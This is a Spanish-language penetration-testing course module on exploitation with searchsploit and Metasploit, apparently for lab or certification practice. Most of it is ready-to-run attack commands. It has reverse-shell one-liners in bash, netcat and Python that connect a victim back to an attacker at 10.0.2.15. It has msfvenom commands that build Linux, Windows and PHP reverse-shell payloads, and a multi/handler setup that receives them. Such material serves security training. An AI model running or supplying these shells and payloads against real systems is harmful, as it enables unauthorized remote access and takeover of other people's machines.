09 · Explotación y Metasploit

Convertir una vulnerabilidad en acceso real. Verás cómo buscar exploits, usar Metasploit y, lo más importante, entender las shells (reverse vs bind).

1. Buscar exploits por versión

$ searchsploit vsftpd 2.3.4           # busca en la base local Exploit-DB
$ searchsploit -m 17491               # copia (mirror) el exploit a tu carpeta
$ searchsploit apache 2.4.49
# También: Google "servicio versión exploit", github, exploit-db.com
💡 El flujo mentalNmap te dio “vsftpd 2.3.4” → searchsploit → hay backdoor → lo lanzas → shell. La versión del módulo 06 es la llave.

2. Shells: reverse vs bind (concepto CLAVE)

🧠 AnalogíaReverse = le das tu número a alguien y te llama él (su teléfono marca hacia fuera, cosa que su operador permite). Bind = tú llamas a su número, pero su centralita (firewall) puede rechazar llamadas entrantes.

3. Montar una reverse shell a mano

# 1) En Kali, ponte a escuchar
$ nc -lvnp 443
# 2) En la víctima (por webshell, inyección, etc.) ejecuta UNA de estas:
bash -i >& /dev/tcp/10.0.2.15/443 0>&1          # bash
nc -e /bin/bash 10.0.2.15 443                   # netcat clásico
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.2.15",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
💡 Web útilrevshells.com genera reverse shells en cualquier lenguaje. Y recuerda estabilizar la shell (módulo 02, recuadro OSCP).

4. msfvenom: fabricar payloads

# Reverse shell Linux (ELF)
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=443 -f elf -o shell
# Reverse shell Windows (EXE)
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=443 -f exe -o shell.exe
# Webshell PHP
$ msfvenom -p php/reverse_php LHOST=10.0.2.15 LPORT=443 -f raw -o shell.php
📘 LHOST / LPORT / RHOSTLHOST = tu IP (donde la víctima te devuelve la shell). LPORT = tu puerto de escucha. RHOST = la IP de la víctima.

7. Multi/handler: recibir shells

msf> use exploit/multi/handler
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> set LHOST 10.0.2.15
msf> set LPORT 443
msf> run        # queda escuchando; ejecuta tu shell.exe en la víctima
